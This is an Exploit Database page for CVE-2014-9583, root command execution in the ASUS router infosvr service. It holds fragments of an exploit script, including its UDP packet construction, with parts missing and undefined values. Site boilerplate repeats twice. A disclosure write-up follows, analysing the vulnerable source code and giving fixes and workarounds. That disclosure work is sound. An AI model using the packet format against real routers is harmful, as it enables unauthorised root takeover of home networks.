# Exploit Title: ASUSWRT 3.0.0.4.376_1071 LAN Backdoor Command Execution
# Date: 2014-10-11
# Vendor Homepage: http://www.asus.com/
# Software Link: http://dlcdnet.asus.com/pub/ASUS/wireless/RT-N66U_B1/FW_RT_N66U_30043762524.zip
# Source code: http://dlcdnet.asus.com/pub/ASUS/wireless/RT-N66U_B1/GPL_RT_N66U_30043762524.zip
# Tested Version: 3.0.0.4.376_1071-g8696125
# Tested Device: RT-N66U

# Description:
# A service called "infosvr" listens on port 9999 on the LAN bridge.
# Normally this service is used for device discovery using the
# "ASUS Wireless Router Device Discovery Utility", but this service contains a
# feature that allows an unauthenticated user on the LAN to execute commands
# <= 237 bytes as root. Source code is in asuswrt/release/src/router/infosvr.
# "iboxcom.h" is in asuswrt/release/src/router/shared.
#
# Affected devices may also include wireless repeaters and other networking
# products, especially the ones which have "Device Discovery" in their features
# list.
#
# Using broadcast address as the IP address should work and execute the command
# on all devices in the network segment, but only receiving one response is
# supported by this script.

    sys.exit(1)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('0.0.0.0', PORT))
sock.settimeout(2)

# Request consists of following things

# MacAddress    [byte[6]]   ; Double-wrongly "checked" with memcpy instead of memcmp
# Password      [byte[32]]  ; Not checked at all
# Length        [word]
# Command       [byte[420]] ; 420 bytes in struct, 256 - 19 unusable in code = 237 usable

packet = (b'\x0C\x15\x33\x00' + os.urandom(4) + (b'\x00' * 38) + struct.pack('<H', len(enccmd)) + enccmd).ljust(512, b'\x00')

# OpCode        [word]      ; NET_CMD_ID_MANU_CMD
# Info          [dword]     ; Equal to Info of request
# MacAddress    [byte[6]]   ; Filled in for us

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# ASUS Router infosvr UDP Broadcast root Command Execution

Several models of ASUS's routers include a service called *infosvr* that listens on UDP broadcast port 9999 on the LAN or WLAN interface. It's used by one of ASUS's tools to ease router configuration by automatically locating routers on the local subnet. This service runs with *root* privileges and contains an unauthenticated command execution vulnerability. The source code for this service, as well as the rest of the router, is available from [ASUS's Support Site](http://support.asus.com/).

## CVE

The CVE assigned to this issue is CVE-2014-9583 (alas, not CVE-2014-10000 after all :-/).

## Affected Versions

Currently, all known firmware versions for applicable routers (RT-AC66U, RT-N66U, etc.) are assumed vulnerable. Testing was performed against 3.0.0.376.2524-g0013f52.

The following routers/firmware versions are confirmed vulnerable:

| Router | Firmware Version | Verified By |
| --- | --- | --- |
| RT-N66U | 3.0.0.4.376\_1071-g8696125 | Friedrich Postelstorfer |
| RT-AC87U | 3.0.0.4.378\_3754 | David Longenecker |
| RT-N56U | 3.0.0.4.374\_5656 | @argilo |

## Technical Details

Consider the following excerpt from the [ASUSWRT-Merlin project](https://github.com/RMerl/asuswrt-merlin), which is an enhanced fork of ASUS's code. You can view the file in it's entirety (recommended for extra lulz) [here](https://github.com/RMerl/asuswrt-merlin/blob/9ebbc9dcab0b1243d703984aa02dbdb7093ccc12/release/src/router/infosvr/common.c).

```
   177  char *processPacket(int sockfd, char *pdubuf)
   178  {
   ...
   202      phdr = (IBOX_COMM_PKT_HDR *)pdubuf;
   ...
   207      if (phdr->ServiceID==NET_SERVICE_ID_IBOX_INFO &&
   208          phdr->PacketType==NET_PACKET_TYPE_CMD)
   209      {
   ...
```

The *processPacket* function is called after receiving a packet of *INFO\_PDU\_LENGTH* (512) bytes. The specific vulnerable code path is *main*->*processReq*->*processPacket*. The service then casts the packet to a structure and checks that the *ServiceID* and *PacketType* fields match expected values.

The following block contains what is believed to be the root cause of this vulnerability.

```
   222          if (phdr->OpCode!=NET_CMD_ID_GETINFO && phdr->OpCode!=NET_CMD_ID_GETINFO_MANU)
   223          {
   224                  phdr_ex = (IBOX_COMM_PKT_HDR_EX *)pdubuf;
   225
   226                  // Check Mac Address
   227                  if (memcpy(phdr_ex->MacAddress, mac, 6)==0)
   228                  {
   229                          _dprintf("Mac Error %2x%2x%2x%2x%2x%2x\n",
   230                                  (unsigned char)phdr_ex->MacAddress[0],
   231                                  (unsigned char)phdr_ex->MacAddress[1],
   232                                  (unsigned char)phdr_ex->MacAddress[2],
   233                                  (unsigned char)phdr_ex->MacAddress[3],
   234                                  (unsigned char)phdr_ex->MacAddress[4],
   235                                  (unsigned char)phdr_ex->MacAddress[5]
   236                                  );
   237                          return NULL;
   238                  }
   239
   240                  // Check Password
   241                  //if (strcmp(phdr_ex->Password, "admin")!=0)
   242                  //{
   243                  //      phdr_res->OpCode = phdr->OpCode | NET_RES_ERR_PASSWORD;
   244                  //      _dprintf("Password Error %s\n", phdr_ex->Password);
   245                  //      return NULL;
   246                  //}
   247                  phdr_res->Info = phdr_ex->Info;
   248                  memcpy(phdr_res->MacAddress, phdr_ex->MacAddress, 6);
   249          }
```

The block starts off by excluding a couple of *OpCode* values, which presumably do not require authentication by design. Then, it calls the *memcpy* and suspiciously checks the return value against zero. This is highly indicative that the author intended to use *memcmp* instead. That said, even if this check was implemented properly, knowing the device's MAC address is hardly sufficient authentication.

The following block is commented out, but shows that the author at some point experimented with checking a password. Albeit, in this case, the password was hardcoded as "admin".

Moving on, the following switch statement dispatches processing based on the supplied *OpCode*.

```
   251          switch(phdr->OpCode)
   252          {
   ...
   428                  case NET_CMD_ID_MANU_CMD:
   429                  {
   430                       #define MAXSYSCMD 256
   431                       char cmdstr[MAXSYSCMD];
   432                       PKT_SYSCMD *syscmd;
   ...
   440                       syscmd = (PKT_SYSCMD *)(pdubuf+sizeof(IBOX_COMM_PKT_HDR_EX));
   ...
   443                       if (syscmd->len>=MAXSYSCMD) syscmd->len=MAXSYSCMD;
   444                       syscmd->cmd[syscmd->len]=0;
   445                       syscmd->len=strlen(syscmd->cmd);
   446                       fprintf(stderr,"system cmd: %d %s\n", syscmd->len, syscmd->cmd);
   447  #if 0
   ...
   512  #endif
   513                       {
   514                          sprintf(cmdstr, "%s > /tmp/syscmd.out", syscmd->cmd);
   515                          system(cmdstr);
```

If an attacker specifies the *OpCode* value of *NET\_CMD\_ID\_MANU\_CMD*, the preceding block processes the packet by casting it to a *PKT\_SYSCMD* structure. As such, any members of *syscmd* are fully controlled by the attacker. Before taking care (**wink**) to NUL terminate the command string, the author executes the command on line 514. Following executing the command, the output is read from the temporary file and sent back to the source address of the initiating packet.

## Recommendations

*End Users*: Update firmare to revision 3.0.0.4.376.3754 or newer. It's important to note that the router's "Check for Update" functionality may not work properly. Manually check the version of the firmware you're running and, if older, download/install the new firmware.

*ASUS/Merlin*: Remove the remote command execution functionality from this service. Even if it were guarded with strong authentication, broadcasting a password to the entire local network isn't really something to be desired. If command execution is truly desired it should be provided via SSH or similar secure mechanism.

## Workaround

David Longenecker recommends using a script (JFFS) in combination with the *script\_usbmount* nvram setting to kill the *infosvr* process on boot. For more information check out [his blog post](http://dnlongen.blogspot.com/2015/01/asus-bug-lets-those-on-your-local.html).

Eric Sauvageau (@RMerl) recommends firewalling port 9999 off. For more information see [his post](http://forums.smallnetbuilder.com/showthread.php?t=21774) on the Small Net Builder forum.

Alternatively, disable the *infosvr* service by killing the process after each boot. For extra fun/irony, use the exploit to do this:

```
$ ./asus-cmd "killall -9 infosvr"
[...]

```

NOTE: you won't get response to this command. Again, this will need to be done each time the device restarts.

## Fixes Released

After the initial disclosure if this issue, several parties addressed the issue with their code bases.

2015/01/08 - Eric Sauvageau fixed this issue in the asuswrt-merlin code base. The first release incorporating the fix is 376.49\_5. His changes can be reviewed [here](https://github.com/RMerl/asuswrt-merlin/commit/2d7a0851b35d1a8dc994a18bbb0a83942bf5c4fc), [here](https://github.com/RMerl/asuswrt-merlin/commit/4f41f9ab6bc9d68cfe35a2422ac5cfa16c445961), and [here](https://github.com/RMerl/asuswrt-merlin/commit/97cf3c758dee0ffdcaa5383b2fda90cf2e268c6f).
2015/01/12 - ASUS has released new firmware revisions for affected devices (3.0.0.4.376.3754) that is reportedly not vulnerable.

ASUS addressed the problem by ensuring the *ateCommand\_flag* nvram variable is set to **1** prior to executing the supplied command. This variable is not set in typical builds.

```
loc_404958:
la      $v0, 0x400000
addiu   $a0, $v0, (aAtecommand_fla - 0x400000)  # "ateCommand_flag"
la      $v0, 0x400000
addiu   $a1, $v0, (g_ascONE - 0x400000)  # "1"
la      $v0, 0x400000
addiu   $t9, $v0, (check_nvram - 0x400000)
jalr    $t9 ; check_nvram
nop
lw      $gp, 0x290+var_270($fp)
bnez    $v0, lbl_execute_command
nop
sw      $zero, 0x290+var_14($fp)
b       lbl_return_zero

```
